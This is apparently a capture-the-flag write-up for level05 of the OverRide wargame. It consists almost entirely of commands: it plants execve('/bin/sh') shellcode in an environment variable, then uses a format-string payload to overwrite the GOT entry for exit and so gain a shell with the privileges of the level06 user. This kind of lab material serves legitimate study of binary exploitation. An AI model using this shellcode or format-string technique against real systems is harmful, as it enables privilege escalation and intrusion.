Level05 protections:
```Shell
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
```

Level05 rights:
```Shell
level05@OverRide:~$ ls -la level05 
-rwsr-s---+ 1 level06 users 5176 Sep 10  2016 level05
```

```Shell
export SHELLCODE=`python -c 'print("\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")'`
```

```Shell
(gdb)  x/s *((char **)environ)
0xffffd8d6: "SHELLCODE=1\311\367\341\260\vQh//shh/bin\211\343̀"    
```

%[second part]d %hn %[first part - number of character already print]d %hn

```Shell
level05@OverRide:~$ objdump -R level05 
[...]
080497e0 R_386_JUMP_SLOT   exit
```

```Shell
level05@OverRide:~$ ./level05 
AAAA %10$p
aaaa 0x61616161
```

```Shell
(python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55450d" + "%10$hn" + "%10077d" + "%11$hn")'; cat) | ./level05
```